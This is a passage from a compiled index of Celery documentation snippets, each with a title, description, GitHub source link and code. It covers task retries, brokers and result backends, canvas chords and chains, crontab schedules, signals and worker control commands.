python\nCODE:\n```\nclass MyTask(Task):\n    abstract = True\n```\n\n----------------------------------------\n\nTITLE: Configuring Automatic Retry for All Exceptions in Celery\nDESCRIPTION: Example of a Celery task that will automatically retry on any exception by specifying Exception as the exception type in autoretry_for. This is useful for tasks that should be resilient against any type of failure.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/tasks.rst#2025-04-23_snippet_23\n\nLANGUAGE: python\nCODE:\n```\n@app.task(autoretry_for=(Exception,))\ndef x():\n    ...\n```\n\n----------------------------------------\n\nTITLE: Configuring RPC Result Backend in Celery\nDESCRIPTION: Example configuration for the RPC result backend, showing how to set the backend URL and configure result persistence.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/configuration.rst#2025-04-23_snippet_17\n\nLANGUAGE: python\nCODE:\n```\nresult_backend = 'rpc://'\nresult_persistent = False\n```\n\n----------------------------------------\n\nTITLE: Applying Staggered Delays to a Celery Group using skew() in Python REPL\nDESCRIPTION: Demonstrates the `skew()` method on a Celery `group` object (`g`). Calling `g.skew(stop=10)` modifies the group by applying an increasing delay (countdown) to each task signature within it. The delays will range from 0 seconds up to (but not including) 10 seconds, with a default step of 1 second (0s, 1s, 2s,... 9s). Requires an existing Celery group instance (`g`).\nSOURCE: https://github.com/celery/celery/blob/main/docs/history/whatsnew-3.0.rst#2025-04-23_snippet_31\n\nLANGUAGE: pycon\nCODE:\n```\n>>> g.skew(stop=10)\n```\n\n----------------------------------------\n\nTITLE: Configuring Redis Broker URL\nDESCRIPTION: Basic Redis broker configuration using localhost\nSOURCE: https://github.com/celery/celery/blob/main/docs/getting-started/backends-and-brokers/redis.rst#2025-04-23_snippet_1\n\nLANGUAGE: python\nCODE:\n```\napp.conf.broker_url = 'redis://localhost:6379/0'\n```\n\n----------------------------------------\n\nTITLE: Scheduling Celery Tasks with apply_async (Python)\nDESCRIPTION: Demonstrates scheduling Celery tasks for future execution using the `apply_async` method with `countdown` (delay in seconds) and `eta` (specific execution datetime). Introduced in Celery 0.3.20. Requires `datetime` and `timedelta` objects for `eta`.\nSOURCE: https://github.com/celery/celery/blob/main/docs/history/changelog-1.0.rst#2025-04-23_snippet_15\n\nLANGUAGE: python\nCODE:\n```\n>>> # Run 10 seconds into the future.\n>>> res = apply_async(MyTask, countdown=10);\n\n>>> # Run 1 day from now\n>>> res = apply_async(MyTask,\n...                   eta=datetime.now() + timedelta(days=1))\n```\n\n----------------------------------------\n\nTITLE: Restricting Celery Accepted Content Types (Python)\nDESCRIPTION: This snippet further restricts the accepted content by specifying the MIME type for JSON in the 'accept_content' configuration. This provides more explicit control and may be useful in environments where content types are validated beyond the serializer name. Requires Celery >= 3.0.18. The only parameter is a list of accepted MIME types. Ensuring strict content-type checking helps mitigate risks from untrusted or incorrectly labeled data.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/security.rst#2025-04-23_snippet_1\n\nLANGUAGE: python\nCODE:\n```\naccept_content = ['application/json']\n```\n\n----------------------------------------\n\nTITLE: Defining Time Limits for Celery Tasks in Python\nDESCRIPTION: Example showing how to set time limits for individual Celery tasks by using the time_limit and soft_time_limit attributes on the task decorator. The example creates a sleeptask that applies these limits.\nSOURCE: https://github.com/celery/celery/blob/main/docs/history/changelog-2.3.rst#2025-04-23_snippet_0\n\nLANGUAGE: python\nCODE:\n```\nimport time\n\n@task(time_limit=60, soft_time_limit=30)\ndef sleeptask(seconds):\n    time.sleep(seconds)\n```\n\n----------------------------------------\n\nTITLE: Configuring Google Cloud Storage Result Backend\nDESCRIPTION: Example configuration for using Google Cloud Storage (GCS) as a Celery result backend, including bucket, project, and path settings.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/configuration.rst#2025-04-23_snippet_29\n\nLANGUAGE: python\nCODE:\n```\ngcs_bucket = 'mybucket'\ngcs_project = 'myproject'\ngcs_base_path = '/celery_result_backend'\ngcs_ttl = 86400\n```\n\n----------------------------------------\n\nTITLE: Implementing Error Callback in Celery Python\nDESCRIPTION: Shows an example implementation of an error callback function in Celery, which logs errors to a file.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/canvas.rst#2025-04-23_snippet_41\n\nLANGUAGE: python\nCODE:\n```\nimport os\n\nfrom proj.celery import app\n\n@app.task\ndef log_error(request, exc, traceback):\n    with open(os.path.join('/var/errors', request.id), 'a') as fh:\n        print('--\\n\\n{0} {1} {2}'.format(\n            request.id, exc, traceback), file=fh)\n```\n\n----------------------------------------\n\nTITLE: Configuring Multiple Celery Workers via celeryd_init Signal in Python\nDESCRIPTION: This snippet shows how to connect a function (`configure_workers`) to the `celeryd_init` signal without specifying a sender, making it applicable to all workers. The handler function receives the sender's hostname and the configuration object (`conf`). It then uses conditional logic based on the `sender` hostname to apply different configuration settings (`task_default_rate_limit` or `worker_prefetch_multiplier`) to specific groups of workers or individual workers.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/signals.rst#2025-04-23_snippet_4\n\nLANGUAGE: python\nCODE:\n```\n.. code-block:: python\n\n    from celery.signals import celeryd_init\n\n    @celeryd_init.connect\n    def configure_workers(sender=None, conf=None, **kwargs):\n        if sender in ('worker1@example.com', 'worker2@example.com'):\n            conf.task_default_rate_limit = '10/m'\n        if sender == 'worker3@example.com':\n            conf.worker_prefetch_multiplier = 0\n```\n\n----------------------------------------\n\nTITLE: Attaching Callbacks to AsyncResult with Gevent\nDESCRIPTION: Demonstrates using the new AsyncResult API to attach callbacks to tasks when they finish. This example uses gevent for asynchronous execution.\nSOURCE: https://github.com/celery/celery/blob/main/docs/history/whatsnew-4.0.rst#2025-04-23_snippet_15\n\nLANGUAGE: python\nCODE:\n```\nimport gevent.monkey\nmonkey.patch_all()\n\nimport time\nfrom celery import Celery\n\napp = Celery(broker='amqp://', backend='rpc')\n\n@app.task\ndef add(x, y):\n    return x + y\n\ndef on_result_ready(result):\n    print('Received result for id %r: %r' % (result.id, result.result,))\n\nadd.delay(2, 2).then(on_result_ready)\n\ntime.sleep(3)  # run gevent event loop for a while.\n```\n\n----------------------------------------\n\nTITLE: Adding Consumer with Advanced Queue Options\nDESCRIPTION: Python code showing advanced consumer configuration with exchange, routing key, and additional options. Demonstrates how to programmatically add a consumer with detailed queue specifications.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/workers.rst#2025-04-23_snippet_26\n\nLANGUAGE: pycon\nCODE:\n```\n>>> app.control.add_consumer(\n...     queue='baz',\n...     exchange='ex',\n...     exchange_type='topic',\n...     routing_key='media.*',\n...     options={\n...         'queue_durable': False,\n...         'exchange_durable': False,\n...     },\n...     reply=True,\n...     destination=['w1@example.com', 'w2@example.com'])\n```\n\n----------------------------------------\n\nTITLE: Setting Options on a Celery Task Signature in Python\nDESCRIPTION: Demonstrates how to add execution options to a signature created with the `s()` shortcut (which doesn't directly accept options) by chaining the `set()` method. Here, the `countdown` option is set to 1 second.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/canvas.rst#2025-04-23_snippet_8\n\nLANGUAGE: pycon\nCODE:\n```\n>>> add.s(2, 2).set(countdown=1)\nproj.tasks.add(2, 2)\n```\n\n----------------------------------------\n\nTITLE: Publishing and Consuming Messages with Celery Broker Pools - Python\nDESCRIPTION: Demonstrates how to explicitly acquire producer and connection resources when publishing or consuming messages using the new read and write pools in the Celery app API. Users can pass in their own producer or connection instance, or let Celery acquire one from its pools. The 'app.producer_or_acquire' and 'app.connection_or_acquire' context managers ensure resources are properly acquired and released. The code is designed for extension and customization, and requires a Celery app instance configured for multiprocessing.\nSOURCE: https://github.com/celery/celery/blob/main/docs/history/whatsnew-4.0.rst#2025-04-23_snippet_10\n\nLANGUAGE: python\nCODE:\n```\ndef publish_some_message(app, producer=None):\\n    with app.producer_or_acquire(producer) as producer:\\n        ...\\n\\ndef consume_messages(app, connection=None):\\n    with app.connection_or_acquire(connection) as connection:\\n        ...\n```\n\n----------------------------------------\n\nTITLE: Demonstrating Celery Task Laziness and Evaluation in Python Interactive Shell\nDESCRIPTION: Illustrates Celery's lazy task proxy mechanism: tasks are not fully created until needed. Shows that the task object is initially a 'PromiseProxy', and the proxy is only evaluated when accessed, e.g., via repr(). Also demonstrates use of __evaluated__ method for introspection. Dependency: an existing app object and a task definition using @app.task.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/application.rst#2025-04-23_snippet_15\n\nLANGUAGE: pycon\nCODE:\n```\n>>> @app.task\n>>> def add(x, y):\n...    return x + y\n\n>>> type(add)\n<class 'celery.local.PromiseProxy'>\n\n>>> add.__evaluated__()\nFalse\n\n>>> add        # <-- causes repr(add) to happen\n<@task: __main__.add>\n\n>>> add.__evaluated__()\nTrue\n```\n\n----------------------------------------\n\nTITLE: Task Chain Priority Inheritance Example\nDESCRIPTION: Demonstrates how task priorities are inherited in a Celery chain when task_inherit_parent_priority is enabled\nSOURCE: https://github.com/celery/celery/blob/main/docs/history/whatsnew-4.3.rst#2025-04-23_snippet_4\n\nLANGUAGE: python\nCODE:\n```\nc = celery.chain(\n    add.s(2), # priority=None\n    add.s(3).set(priority=5), # priority=5\n    add.s(4), # priority=5\n    add.s(5).set(priority=3), # priority=3\n    add.s(6), # priority=3\n)\n```\n\n----------------------------------------\n\nTITLE: Demonstrating Task Priority Inheritance in Celery Chain\nDESCRIPTION: Example showing how task priority is inherited through a chain of Celery tasks when task_inherit_parent_priority is enabled. Shows priority inheritance through explicitly set and inherited values.\nSOURCE: https://github.com/celery/celery/blob/main/docs/history/changelog-4.4.rst#2025-04-23_snippet_1\n\nLANGUAGE: python\nCODE:\n```\nc = celery.chain(\n  add.s(2), # priority=None\n  add.s(3).set(priority=5), # priority=5\n  add.s(4), # priority=5\n  add.s(5).set(priority=3), # priority=3\n  add.s(6), # priority=3\n)\n```\n\n----------------------------------------\n\nTITLE: Inspecting Active Tasks in Celery Workers (console)\nDESCRIPTION: Uses the `celery inspect active` command to query all workers in the cluster via broadcast messaging and display the tasks they are currently processing. Requires a Celery application instance (`-A proj`) to be specified.\nSOURCE: https://github.com/celery/celery/blob/main/docs/getting-started/next-steps.rst#2025-04-23_snippet_13\n\nLANGUAGE: console\nCODE:\n```\n$ celery -A proj inspect active\n```\n\n----------------------------------------\n\nTITLE: Executing Celery Task Directly via Signature in Python\nDESCRIPTION: Illustrates how calling a task object (`add(2, 2)`) or its signature object (`add.s(2, 2)()`) directly executes the task's function inline within the current process, returning the result immediately.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/canvas.rst#2025-04-23_snippet_5\n\nLANGUAGE: pycon\nCODE:\n```\n>>> add(2, 2)\n4\n>>> add.s(2, 2)()\n4\n```\n\n----------------------------------------\n\nTITLE: Revoking Tasks by Stamped Headers via CLI\nDESCRIPTION: CLI examples for revoking tasks by stamped headers with options for termination and custom signal.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/workers.rst#2025-04-23_snippet_17\n\nLANGUAGE: console\nCODE:\n```\n$ celery -A proj control revoke_by_stamped_headers stamped_header_key_A=stamped_header_value_1 stamped_header_key_B=stamped_header_value_2\n\n$ celery -A proj control revoke_by_stamped_headers stamped_header_key_A=stamped_header_value_1 stamped_header_key_B=stamped_header_value_2 --terminate\n\n$ celery -A proj control revoke_by_stamped_headers stamped_header_key_A=stamped_header_value_1 stamped_header_key_B=stamped_header_value_2 --terminate --signal=SIGKILL\n```\n\n----------------------------------------\n\nTITLE: Google Pub/Sub Broker Configuration\nDESCRIPTION: Installation and configuration example for using Google Cloud Pub/Sub as a message transport in Celery.\nSOURCE: https://github.com/celery/celery/blob/main/docs/history/changelog-5.5.rst#2025-04-23_snippet_1\n\nLANGUAGE: console\nCODE:\n```\n$ pip install \"celery[gcpubsub]\"\n```\n\nLANGUAGE: python\nCODE:\n```\nbroker_url = 'gcpubsub://projects/project-id'\n```\n\n----------------------------------------\n\nTITLE: Configuring Celery Application from a Configuration Class/Object in Python\nDESCRIPTION: Shows how to define a configuration class with relevant attributes and apply it to a Celery app using config_from_object. Supports both class and fully-qualified class name forms. This enables programmatic grouping of configuration and reusability. The Config class in the snippet includes enable_utc and timezone attributes.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/application.rst#2025-04-23_snippet_10\n\nLANGUAGE: python\nCODE:\n```\nfrom celery import Celery\n\napp = Celery()\n\nclass Config:\n    enable_utc = True\n    timezone = 'Europe/London'\n\napp.config_from_object(Config)\n# or using the fully qualified name of the object:\n#   app.config_from_object('module:Config')\n```\n\n----------------------------------------\n\nTITLE: Disabling Celery Logging Configuration with Signals\nDESCRIPTION: Shows how to completely disable Celery's logging configuration by connecting to the setup_logging signal and overriding it with an empty handler.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/tasks.rst#2025-04-23_snippet_17\n\nLANGUAGE: python\nCODE:\n```\nimport celery\n\n@celery.signals.setup_logging.connect\ndef on_setup_logging(**kwargs):\n    pass\n```\n\n----------------------------------------\n\nTITLE: Scheduling Celery Task Annually on a Specific Date using Crontab\nDESCRIPTION: This Python snippet uses `celery.schedules.crontab` to schedule a task to run once a year at midnight (00:00) on May 11th.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/periodic-tasks.rst#2025-04-23_snippet_10\n\nLANGUAGE: python\nCODE:\n```\ncrontab(0, 0, day_of_month='11', month_of_year='5')\n```\n\n----------------------------------------\n\nTITLE: Defining Transient Queues in Celery (Python)\nDESCRIPTION: This snippet demonstrates how to configure both persistent and transient queues in Celery by using the Queue and Exchange classes from kombu. The key functionality is to create a non-durable (transient) queue where messages are not written to disk, improving performance for non-critical tasks. Dependencies include kombu and Celery, and key parameters are the queue names, exchange objects, delivery_mode, and durable flag; input is a list of Queue objects, and the output is an assignment to Celery's task_queues configuration.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/optimizing.rst#2025-04-23_snippet_0\n\nLANGUAGE: python\nCODE:\n```\nfrom kombu import Exchange, Queue\\n\\ntask_queues = (\\n    Queue('celery', routing_key='celery'),\\n    Queue('transient', Exchange('transient', delivery_mode=1),\\n          routing_key='transient', durable=False),\\n)\\n\n```\n\n----------------------------------------\n\nTITLE: Configuring Result Backend Content Types in Celery (Python)\nDESCRIPTION: Illustrates configuring the `result_accept_content` setting in Celery, introduced in v4.3. This defines a whitelist of allowed content types for results received from the result backend, potentially differing from `accept_content`, especially when using signed messages. If not set, it defaults to the value of `accept_content`. Examples show setting it via serializer name or MIME type.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/configuration.rst#2025-04-23_snippet_2\n\nLANGUAGE: python\nCODE:\n```\n# using serializer name\nresult_accept_content = ['json']\n\n# or the actual content-type (MIME)\nresult_accept_content = ['application/json']\n```\n\n----------------------------------------\n\nTITLE: Listing Available Celery Control Commands (console)\nDESCRIPTION: Displays help information for the `celery control` subcommand via the `--help` flag. This lists commands used to modify the state or behavior of workers at runtime.\nSOURCE: https://github.com/celery/celery/blob/main/docs/getting-started/next-steps.rst#2025-04-23_snippet_16\n\nLANGUAGE: console\nCODE:\n```\n$ celery -A proj control --help\n```\n\n----------------------------------------\n\nTITLE: Listing Available Celery Inspection Commands (console)\nDESCRIPTION: Shows how to display help information for the `celery inspect` subcommand using the `--help` flag. This lists all available inspection commands, which retrieve information without modifying worker state.\nSOURCE: https://github.com/celery/celery/blob/main/docs/getting-started/next-steps.rst#2025-04-23_snippet_15\n\nLANGUAGE: console\nCODE:\n```\n$ celery -A proj inspect --help\n```\n\n----------------------------------------\n\nTITLE: Pinging Specific Workers with Python\nDESCRIPTION: Python code to ping specific workers using the ping method with a destination argument. Shows how to target ping requests to a subset of workers.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/workers.rst#2025-04-23_snippet_41\n\nLANGUAGE: pycon\nCODE:\n```\n>>> ping(['worker2.example.com', 'worker3.example.com'])\n[{'worker2.example.com': 'pong'},\n {'worker3.example.com': 'pong'}]\n```\n\n----------------------------------------\n\nTITLE: Configuring Astra DB Backend Settings in Celery\nDESCRIPTION: Example configuration for connecting to an Astra DB instance as a result backend, using a secure connection bundle, authentication credentials, and specifying keyspace and table.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/configuration.rst#2025-04-23_snippet_24\n\nLANGUAGE: python\nCODE:\n```\nresult_backend = 'cassandra://'\ncassandra_keyspace = 'celery'\ncassandra_table = 'tasks'\ncassandra_read_consistency = 'QUORUM'\ncassandra_write_consistency = 'QUORUM'\ncassandra_auth_provider = 'PlainTextAuthProvider'\ncassandra_auth_kwargs = {\n  'username': '<<CLIENT_ID_FROM_ASTRA_DB_TOKEN>>',\n  'password': '<<CLIENT_SECRET_FROM_ASTRA_DB_TOKEN>>'\n}\ncassandra_secure_bundle_path = '/path/to/secure-connect-bundle.zip'\ncassandra_entry_ttl = 86400\n```\n\n----------------------------------------\n\nTITLE: Initializing Celery App with Broker URL in Python\nDESCRIPTION: Shows how to initialize a Celery application instance by providing the broker connection URL directly as an argument to the `Celery` class constructor. This provides a convenient way to configure the broker without using separate configuration settings. Requires the `celery` library.\nSOURCE: https://github.com/celery/celery/blob/main/docs/history/whatsnew-3.0.rst#2025-04-23_snippet_23\n\nLANGUAGE: python\nCODE:\n```\napp = Celery(broker='redis://')\n```\n\n----------------------------------------\n\nTITLE: Routing Tasks to Transient Queues with task_routes (Python)\nDESCRIPTION: This configuration code sets up Celery's task_routes to assign a specific task (proj.tasks.add) to the default queue with delivery_mode set to transient, ensuring it is not persisted to disk. The snippet requires no additional dependencies beyond Celery. The key parameters are the task name, queue, and delivery mode; intended as part of the settings module, expected output is that relevant tasks are routed as configured.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/optimizing.rst#2025-04-23_snippet_1\n\nLANGUAGE: python\nCODE:\n```\ntask_routes = {\\n    'proj.tasks.add': {'queue': 'celery', 'delivery_mode': 'transient'}\\n}\\n\n```\n\n----------------------------------------\n\nTITLE: Implementing a Custom Camera for Celery Event Snapshots (Python)\nDESCRIPTION: Example of a custom Camera class (DumpCam) that captures Celery event snapshots and prints worker and task information to the console.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/monitoring.rst#2025-04-23_snippet_33\n\nLANGUAGE: python\nCODE:\n```\nfrom pprint import pformat\n\nfrom celery.events.snapshot import Polaroid\n\nclass DumpCam(Polaroid):\n    clear_after = True  # clear after flush (incl, state.event_count).\n\n    def on_shutter(self, state):\n        if not state.event_count:\n            # No new events since last snapshot.\n            return\n        print('Workers: {0}'.format(pformat(state.workers, indent=4)))\n        print('Tasks: {0}'.format(pformat(state.tasks, indent=4)))\n        print('Total: {0.event_count} events, {0.task_count} tasks'.format(\n            state))\n```\n\n----------------------------------------\n\nTITLE: Canceling Consumer Programmatically\nDESCRIPTION: Python code to cancel a consumer programmatically using the control interface. Shows how to use the cancel_consumer method with reply enabled.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/workers.rst#2025-04-23_snippet_29\n\nLANGUAGE: console\nCODE:\n```\n>>> app.control.cancel_consumer('foo', reply=True)\n[{u'worker1.local': {u'ok': u\"no longer consuming from u'foo'\"}}]\n```\n\n----------------------------------------\n\nTITLE: Executing Complex Chord with Nested Groups in Python\nDESCRIPTION: Demonstrates how to construct and execute a complex chord pattern with nested groups and chains in Celery. Shows proper nesting of tasks using chord, group, and chain operations.\nSOURCE: https://github.com/celery/celery/blob/main/docs/history/changelog-4.3.rst#2025-04-23_snippet_1\n\nLANGUAGE: python\nCODE:\n```\nc = chord(\n  group([\n      chain(\n          dummy.si(),\n          chord(\n              group([dummy.si(), dummy.si()]),\n              dummy.si(),\n          ),\n      ),\n      chain(\n          dummy.si(),\n          chord(\n              group([dummy.si(), dummy.si()]),\n              dummy.si(),\n          ),\n      ),\n  ]),\n  dummy.si()\n)\n\nc.delay().get()\n```\n\n----------------------------------------\n\nTITLE: Using Chords in Celery for Parallel Addition\nDESCRIPTION: Demonstrates how to use a chord to calculate additions in parallel and then sum the results, showing the syntax for defining header tasks and a callback.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/canvas.rst#2025-04-23_snippet_52\n\nLANGUAGE: pycon\nCODE:\n```\n>>> from celery import chord\n>>> from tasks import add, tsum\n\n>>> chord(add.s(i, i)\n...       for i in range(100))(tsum.s()).get()\n9900\n```\n\n----------------------------------------\n\nTITLE: Enabling Events on Celery Workers\nDESCRIPTION: Sends a control command to workers in the cluster to start sending task events, which are necessary for real-time monitoring tools like Flower or `celery events`. Requires the Celery application instance (`-A proj`).\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/monitoring.rst#2025-04-23_snippet_15\n\nLANGUAGE: console\nCODE:\n```\n$ celery -A proj control enable_events\n```\n\n----------------------------------------\n\nTITLE: Specifying Custom Base Task in Celery\nDESCRIPTION: Demonstrates how to specify a custom base task class when defining a Celery task using the @app.task decorator.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/application.rst#2025-04-23_snippet_24\n\nLANGUAGE: python\nCODE:\n```\n@app.task(base=OtherTask):\ndef add(x, y):\n    return x + y\n```\n\n----------------------------------------\n\nTITLE: Inspecting Registered Celery Tasks\nDESCRIPTION: Lists all task types registered within the Celery application `proj` across the cluster's workers. Requires the Celery application instance (`-A proj`).\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/monitoring.rst#2025-04-23_snippet_11\n\nLANGUAGE: console\nCODE:\n```\n$ celery -A proj inspect registered\n```\n\n----------------------------------------\n\nTITLE: Evaluating Subtasks Using Tilde Operator in Celery\nDESCRIPTION: Demonstrates the use of the tilde (~) operator to evaluate Celery subtasks directly, returning the result of the computation instead of a subtask object.\nSOURCE: https://github.com/celery/celery/blob/main/docs/history/whatsnew-3.0.rst#2025-04-23_snippet_7\n\nLANGUAGE: pycon\nCODE:\n```\n>>> ~add.s(2, 2)\n4\n\n>>> ~(add.s(2, 2) | pow.s(2))\n```\n\nLANGUAGE: pycon\nCODE:\n```\n>>> chain(add.s(2, 2), pow.s(2)).apply_async().get()\n```\n\n----------------------------------------\n\nTITLE: Adjusting Worker Pool Size via Command Line in Celery\nDESCRIPTION: Demonstrates how to use the celery control command line to grow or shrink the worker process pool for specific workers, specifying the number of processes to add or remove.\nSOURCE: https://github.com/celery/celery/blob/main/docs/history/whatsnew-3.0.rst#2025-04-23_snippet_14\n\nLANGUAGE: console\nCODE:\n```\n$ celery control -d w1.example.com pool_grow 2\n$ celery control -d w1.example.com pool_shrink 2\n```\n\n----------------------------------------\n\nTITLE: Piping and Chaining Task Signatures in Celery (Python)\nDESCRIPTION: This snippet demonstrates how to compose Celery tasks using pipe (|) operators to create a task chain or pipeline. Two pipelines are formed: first by piping the output of sometask.s() into othertask.s(), then prefixing this chain with mytask.s(). Dependencies are Celery’s task signature and operator overloading for chaining (|). The snippet is intended for users constructing complex workflow DAGs. The resulting objects, 'pipe' and 'new_pipe', are composable task chains, which can be scheduled or later invoked as group tasks.\nSOURCE: https://github.com/celery/celery/blob/main/docs/history/changelog-3.0.rst#2025-04-23_snippet_7\n\nLANGUAGE: python\nCODE:\n```\npipe = sometask.s() | othertask.s()\\nnew_pipe = mytask.s() | pipe\n```\n\n----------------------------------------\n\nTITLE: Disabling Event Messages in Celery Workers (console)\nDESCRIPTION: Uses the `celery control disable_events` command to instruct workers to stop sending event messages. This is typically done after a monitoring session to reduce message broker traffic and worker overhead.\nSOURCE: https://github.com/celery/celery/blob/main/docs/getting-started/next-steps.rst#2025-04-23_snippet_20\n\nLANGUAGE: console\nCODE:\n```\n$ celery -A proj control disable_events\n```\n\n----------------------------------------\n\nTITLE: Chaining Groups in Celery 4.4\nDESCRIPTION: Shows how group chaining works in Celery 4.4, where groups now execute sequentially rather than being joined into a single group. This example demonstrates chaining two groups of tasks and getting their results.\nSOURCE: https://github.com/celery/celery/blob/main/docs/history/whatsnew-4.4.rst#2025-04-23_snippet_1\n\nLANGUAGE: python\nCODE:\n```\n>>> result = group(add.si(1, 2), add.si(1, 2)) | group(tsum.s(), tsum.s()).delay()\n>>> result.get()\n[6, 6]\n```\n\n----------------------------------------\n\nTITLE: Sharing Task Registries Between Celery Applications\nDESCRIPTION: Shows how to create Celery applications that share the same task registry, allowing tasks to be accessible from multiple app instances.\nSOURCE: https://github.com/celery/celery/blob/main/docs/history/whatsnew-3.0.rst#2025-04-23_snippet_17\n\nLANGUAGE: pycon\nCODE:\n```\n>>> app1 = Celery()\n>>> app2 = Celery(tasks=app1.tasks)\n```\n\n----------------------------------------\n\nTITLE: Scheduling Celery Task Quarterly using Crontab\nDESCRIPTION: This Python snippet configures a Celery task using `celery.schedules.crontab` to run at midnight (00:00) every day, but only during months that are divisible by 3 (effectively, the first month of each quarter: January, April, July, October).\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/periodic-tasks.rst#2025-04-23_snippet_11\n\nLANGUAGE: python\nCODE:\n```\ncrontab(0, 0, month_of_year='*/3')\n```\n\n----------------------------------------\n\nTITLE: Configuring Task Retry Behavior in Celery\nDESCRIPTION: Example of disabling automatic retry for a Celery task by setting the retry parameter to False when calling apply_async. This prevents Celery from automatically retrying the task in case of connection failures.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/calling.rst#2025-04-23_snippet_13\n\nLANGUAGE: python\nCODE:\n```\nadd.apply_async((2, 2), retry=False)\n```\n\n----------------------------------------\n\nTITLE: Parent-Child Task Priority Inheritance\nDESCRIPTION: Example showing how child tasks inherit priority from parent tasks when task_inherit_parent_priority setting is enabled\nSOURCE: https://github.com/celery/celery/blob/main/docs/history/whatsnew-4.3.rst#2025-04-23_snippet_5\n\nLANGUAGE: python\nCODE:\n```\n@app.task(bind=True)\ndef child_task(self):\n    pass\n\n@app.task(bind=True)\ndef parent_task(self):\n    child_task.delay()\n\n# child_task will also have priority=5\nparent_task.apply_async(args=[], priority=5)\n```\n\n----------------------------------------\n\nTITLE: Inspecting RabbitMQ Queue Details using rabbitmqctl\nDESCRIPTION: Uses the RabbitMQ management command `rabbitmqctl` to list queues within the default virtual host. It displays the queue name, total messages, messages ready for delivery, and messages currently held by consumers (unacknowledged). Requires `rabbitmqctl` installed and accessible.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/monitoring.rst#2025-04-23_snippet_30\n\nLANGUAGE: console\nCODE:\n```\n$ rabbitmqctl list_queues name messages messages_ready \\\n                              messages_unacknowledged\n```\n\n----------------------------------------\n\nTITLE: Starting the Flower Web Monitor\nDESCRIPTION: Starts the Flower web server, which monitors the Celery application `proj`. By default, it listens on `http://localhost:5555`. Requires Flower to be installed and the Celery application instance (`-A proj`).\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/monitoring.rst#2025-04-23_snippet_21\n\nLANGUAGE: console\nCODE:\n```\n$ celery -A proj flower\n```\n\n----------------------------------------\n\nTITLE: Initializing Worker Inspection in Python\nDESCRIPTION: Python code showing how to initialize the worker inspection interface. Demonstrates different ways to create an inspector for all workers or specific workers.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/workers.rst#2025-04-23_snippet_33\n\nLANGUAGE: pycon\nCODE:\n```\n>>> # Inspect all nodes.\n>>> i = app.control.inspect()\n\n>>> # Specify multiple nodes to inspect.\n>>> i = app.control.inspect(['worker1.example.com',\n                            'worker2.example.com'])\n\n>>> # Specify a single node to inspect.\n>>> i = app.control.inspect('worker1.example.com')\n```\n\n----------------------------------------\n\nTITLE: Starting Worker with Specific Queues\nDESCRIPTION: Command to start a Celery worker that consumes from specific queues. The -Q option allows specifying a comma-separated list of queue names that the worker should consume tasks from.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/workers.rst#2025-04-23_snippet_22\n\nLANGUAGE: console\nCODE:\n```\n$ celery -A proj worker -l INFO -Q foo,bar,baz\n```\n\n----------------------------------------\n\nTITLE: Task Result Retrieval in Celery\nDESCRIPTION: Shows how to get results from a delayed task execution using allow_join_result() context manager\nSOURCE: https://github.com/celery/celery/blob/main/docs/history/changelog-3.1.rst#2025-04-23_snippet_4\n\nLANGUAGE: python\nCODE:\n```\nresult = other_task.delay()\nwith allow_join_result():\n    result.get()\n```\n\n----------------------------------------\n\nTITLE: Using Remote Control Commands for Queue Management in Celery\nDESCRIPTION: Shows how to use the add_consumer and cancel_consumer remote control commands programmatically to dynamically manage worker queue subscriptions.\nSOURCE: https://github.com/celery/celery/blob/main/docs/history/whatsnew-3.0.rst#2025-04-23_snippet_9\n\nLANGUAGE: pycon\nCODE:\n```\n>>> celery.control.add_consumer(queue_name,\n...     destination=['w1.example.com'])\n>>> celery.control.cancel_consumer(queue_name,\n...     destination=['w1.example.com'])\n```\n\n----------------------------------------\n\nTITLE: Pinging Workers with Python\nDESCRIPTION: Python code to ping workers and check if they're alive using the control interface. Shows how to set timeouts and target specific workers for ping requests.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/workers.rst#2025-04-23_snippet_40\n\nLANGUAGE: pycon\nCODE:\n```\n>>> app.control.ping(timeout=0.5)\n[{'worker1.example.com': 'pong'},\n {'worker2.example.com': 'pong'},\n {'worker3.example.com': 'pong'}]\n```\n\n----------------------------------------\n\nTITLE: Configuring Specific Celery Worker via celeryd_init Signal in Python\nDESCRIPTION: This snippet demonstrates how to connect a function (`configure_worker12`) to the `celeryd_init` signal, specifically for a worker identified by 'worker12@example.com'. The handler function receives the worker's configuration (`conf`) and modifies the `task_default_rate_limit` setting for that particular worker instance upon its initialization. This allows for worker-specific configurations.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/signals.rst#2025-04-23_snippet_3\n\nLANGUAGE: python\nCODE:\n```\n.. code-block:: python\n\n    from celery.signals import celeryd_init\n\n    @celeryd_init.connect(sender='worker12@example.com')\n    def configure_worker12(conf=None, **kwargs):\n        conf.task_default_rate_limit = '10/m'\n```\n\n----------------------------------------\n\nTITLE: 